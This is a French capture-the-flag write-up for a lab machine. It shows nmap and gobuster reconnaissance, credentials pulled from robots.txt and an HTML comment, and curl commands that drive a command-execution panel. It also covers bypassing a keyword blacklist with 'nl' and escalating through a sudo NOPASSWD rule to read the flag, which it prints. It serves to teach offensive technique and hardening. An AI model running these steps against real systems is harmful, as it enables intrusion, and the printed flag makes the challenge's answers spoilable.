H4ck3rz
> **Catégorie :** Web / Énumération / RCE / Privilege Escalation
> **Cible :** `10.10.0.24`
> **Flag :** `EPI{71me_70_D0_7H05E_NcuR5e2}`
---
Objectif
Un site web expose un panneau d'administration caché. Le but est de rassembler
des identifiants dispersés dans le code et les fichiers du site, de se connecter,
d'exploiter un panneau d'exécution de commandes (RCE), puis d'escalader les
privilèges via une mauvaise configuration `sudo` pour lire le flag.
---
1. Reconnaissance initiale (Nmap)
```bash
nmap -sV -sC 10.10.0.24
```
Résultat :
Port	Service	Remarque
22	SSH	accès distant
80	Apache (HTTP)	site web + `robots.txt`
Le script NSE `-sC` révèle un `robots.txt` qui contient un chemin caché :
```
/1337_53CR37_l41r
```
> `robots.txt` sert normalement à dire aux moteurs de recherche quoi ne pas
> indexer. Les développeurs y listent parfois des chemins « secrets »… ce qui
> revient à publier une carte de ce qu'ils veulent cacher.
---
2. Énumération web (Gobuster)
On brute-force l'arborescence du site pour découvrir les pages non liées :
```bash
gobuster dir -u http://10.10.0.24/ \
  -w /usr/share/dirb/wordlists/common.txt \
  -x php,html,txt
```
`dir` → mode énumération de répertoires/fichiers
`-u` → l'URL cible
`-w` → la wordlist (liste de noms à tester)
`-x php,html,txt` → teste aussi ces extensions sur chaque mot
Découvertes :
`login.php` → page de connexion
`portal.php` → panneau (accès restreint)
`assets/` → dossier de ressources
---
3. Collecte des indices cachés
Le challenge éparpille les identifiants en deux endroits :
a) La page secrète du `robots.txt` (`/1337_53CR37_l41r/`) contenait le
mot de passe en clair :
```
8ES7_SHeLL_Ev4H
```
b) Un commentaire HTML sur la page d'accueil. On lit le HTML brut avec
`curl` (les commentaires `<!-- ... -->` n'apparaissent pas dans le navigateur) :
```bash
curl http://10.10.0.24/
```
→ On y trouve le nom d'utilisateur :
```
d4rk_T1t0u4N
```
> **Leçon :** toujours lire le **code source** d'une page (`curl` ou Ctrl+U),
> pas seulement le rendu. Les développeurs y laissent souvent des commentaires
> sensibles.
---
4. Authentification
On envoie les identifiants en POST au formulaire de login, en enregistrant le
cookie de session :
```bash
curl -s -X POST http://10.10.0.24/login.php \
  -d "username=d4rk_T1t0u4N&password=8ES7_SHeLL_Ev4H&sub=Login" \
  -c cookies.txt -i
```
`-X POST` → méthode POST (envoi de formulaire)
`-d` → les données du formulaire
`-c cookies.txt` → sauvegarde le cookie de session reçu dans un fichier
`-i` → affiche les en-têtes de la réponse
Réponse : `302 Found` → redirection vers `portal.php` = connexion
réussie. Le cookie de session est maintenant dans `cookies.txt`.
---
5. Découverte du RCE (Shell Panel)
`portal.php` contient un formulaire qui exécute des commandes système (en
tant que l'utilisateur `www-data`, le compte du serveur web). C'est une RCE
(Remote Code Execution) fournie « clé en main ».
⚠️ Un filtre bloque certains mots-clés courants (`cat`, `head`, etc.), mais
il est incomplet : il laisse passer `nl`, `sudo`, `php`…
> **Principe des blacklists :** filtrer une liste de mots interdits est presque
> toujours contournable, car il existe des dizaines de façons d'obtenir le même
> résultat. Ici, `nl` (number lines) affiche le contenu d'un fichier, exactement
> comme `cat`, mais n'est pas dans la liste noire.
---
6. Escalade de privilèges
Première question sur toute machine compromise : « qu'est-ce que je peux faire
en tant que root ou en tant qu'un autre utilisateur ? ». On liste les droits
`sudo` :
```bash
curl -s -b cookies.txt -X POST http://10.10.0.24/portal.php \
  --data-urlencode "command=sudo -l 2>&1" \
  --data-urlencode "sub=Execute"
```
`-b cookies.txt` → réutilise le cookie de session sauvegardé (sinon on est
déconnecté)
`--data-urlencode` → encode proprement la commande pour l'URL (gère les
espaces et caractères spéciaux)
`sudo -l` → liste ce que l'utilisateur courant peut exécuter via sudo
`2>&1` → redirige les erreurs vers la sortie standard pour tout voir dans la
réponse
Résultat clé : `www-data` peut exécuter n'importe quelle commande en tant
que l'utilisateur `titouan`, sans mot de passe :
```
(titouan) NOPASSWD: ALL
```
C'est la faille d'escalade : on peut « devenir » `titouan` à volonté.
---
7. Lecture du flag
Le flag `user.txt` appartient à `titouan`. On l'ouvre en usurpant son identité
via sudo, et on utilise `nl` (non filtré) au lieu de `cat` (filtré) :
```bash
curl -s -b cookies.txt -X POST http://10.10.0.24/portal.php \
  --data-urlencode "command=sudo -u titouan nl /home/titouan/user.txt" \
  --data-urlencode "sub=Execute"
```
`sudo -u titouan` → exécute la commande en tant que `titouan`
`nl` → affiche le fichier (contournement du filtre sur `cat`)
→ Flag obtenu :
```
EPI{71me_70_D0_7H05E_NcuR5e2}
```
---
Concepts clés à retenir
Concept	Explication
robots.txt	Ne cache rien : il liste souvent les chemins « sensibles » à ne pas indexer, ce qui les révèle.
Énumération de répertoires	Gobuster découvre les pages non liées en testant une wordlist.
Commentaires HTML	Les secrets laissés en commentaire sont invisibles dans le navigateur mais présents dans le source.
Gestion de session (cookies)	`-c` sauvegarde le cookie à la connexion, `-b` le réutilise ensuite.
Filtre par blacklist	Bloquer une liste de mots est contournable (`nl` au lieu de `cat`). Il faut whitelister, pas blacklister.
sudo NOPASSWD	Une règle sudo trop permissive permet de devenir un autre utilisateur sans mot de passe → escalade de privilèges.
---
Résumé de la chaîne d'attaque
```
nmap (22/80) → robots.txt → /1337_53CR37_l41r (mot de passe) →
curl page d'accueil (username en commentaire) → login.php (cookie) →
portal.php (RCE, filtre incomplet) → sudo -l (NOPASSWD titouan) →
sudo -u titouan nl user.txt → FLAG
```